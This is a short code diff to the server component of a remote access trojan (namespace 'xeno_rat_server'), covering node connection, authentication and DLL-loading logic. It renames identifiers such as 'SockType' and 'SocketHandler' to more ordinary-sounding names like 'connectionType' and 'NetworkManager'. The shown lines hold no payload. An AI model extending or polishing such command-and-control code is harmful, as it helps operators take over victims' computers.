@@ -75,7 +75,7 @@ namespace xeno_rat_server
             {
                 Logcallback($"Loading {dllname} dll...", Color.Blue);
             }
-            if (clientsubsock.SockType != 2)
+            if (clientsubsock.connectionType != 2)
             {
                 if (Logcallback != null)
                 {
@@ -140,7 +140,7 @@ namespace xeno_rat_server
 
         public static async Task<int> SetType2setIdAsync(Node subnode)
         {
-            if (subnode.SockType == 2)
+            if (subnode.connectionType == 2)
             {
                 int setID = subnode.Parent.SubNodeIdCount;
                 subnode.Parent.SubNodeIdCount += 1;
@@ -155,18 +155,18 @@ namespace xeno_rat_server
         }
         public static async Task Type2returnAsync(Node subNode) 
         {
-            if (subNode.SockType == 2) 
+            if (subNode.connectionType == 2) 
             {
                 byte[] opcode = new byte[] { 3 };
                 await subNode.SendAsync(opcode);
             }
         }
-        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int ID, Action<Node> OnDisconnect = null)
+        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int ID, Action<Node> HandleServiceStop = null)
         {
             Node conn;
             try
             {
-                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
+                conn = new Node(new NetworkManager(sock, key), HandleServiceStop);
                 if (!(await conn.AuthenticateAsync(ID)))
                 {
                     return null;
